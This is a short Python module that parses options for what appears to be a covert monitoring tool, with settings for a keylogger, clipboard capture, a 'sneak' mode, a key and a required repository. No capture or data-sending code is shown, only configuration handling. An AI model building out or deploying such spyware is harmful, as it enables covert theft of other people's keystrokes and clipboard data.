from params import *
from typing import Callable, Dict, Any
from threading import Event

PARAM: dict[str, str] = dict()
METHODS: Dict[str, Callable[..., Any]] = dict()
RUNNING = Event()
RUNNING.set()


def update(argline: list) -> None:
    if REPO != "":
        PARAM["repo"] = REPO
    if KEY != "":
        PARAM["key"] = KEY
    if INTERVAL != "":
        PARAM["interval"] = INTERVAL
    if SNEAK != "":
        PARAM["sneak"] = SNEAK
    if KEYLOGGER:
        PARAM["keylogger"] = ""
    if CLIPBOARD != "":
        PARAM["clipboard"] = ""
    for i in range(0, len(argline)):
        match argline[i]:
            case "sneak":
                PARAM["sneak"] = argline[i + 1]
                i += 1
            case "key":
                PARAM["key"] = argline[i + 1]
                i += 1
            case "interval":
                PARAM["interval"] = argline[i + 1]
                i += 1
            case "repo":
                PARAM["repo"] = argline[i + 1]
                i += 1
            case "keylogger":
                PARAM["keylogger"] = ""
            case "clipboard":
                PARAM["clipboard"] = ""
            case _:
                continue
    if PARAM.get("repo") == None:
        raise Exception("Repository required to start")